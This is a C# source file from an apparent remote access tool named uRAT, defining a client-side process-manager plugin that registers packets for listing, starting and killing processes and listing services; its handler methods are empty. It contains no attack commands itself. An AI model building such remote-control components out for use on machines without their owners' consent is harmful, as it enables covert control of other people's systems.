using System;
using System.Collections.Generic;
using uNet2.Packet;
using uNet2.Packet.Events;
using uNet2.SocketOperation;
using uRAT.Client.Plugin.Client;
using uRAT.ManagersClientPlugin.ProcessManager.Operations;
using uRAT.ManagersClientPlugin.ProcessManager.Packets;

namespace uRAT.ManagersClientPlugin.ProcessManager
{
    class ProcessManagerPlugin : IClientPlugin
    {
        public List<IPacket> PluginPackets
        {
            get
            {
                return new List<IPacket>
                {
                    new RefreshProcessesPacket(),
                    new ProcessInformationPacket(),
                    new KillProcessPacket(),
                    new StartProcessPacket(),
                    new ServiceInformationPacket(),
                    new RefreshServicesPacket()
                };
            }
        }

        public List<ISocketOperation> SocketOperations
        {
            get
            {
                return new List<ISocketOperation>
                {
                    new ProcessManagerOperation()
                };
            }
        }

        public void Initialize()
        {

        }

        public void OnClientConnected()
        {

        }

        public void OnPacketReceived(object sender, ClientPacketEventArgs e)
        {

        }
    }
}
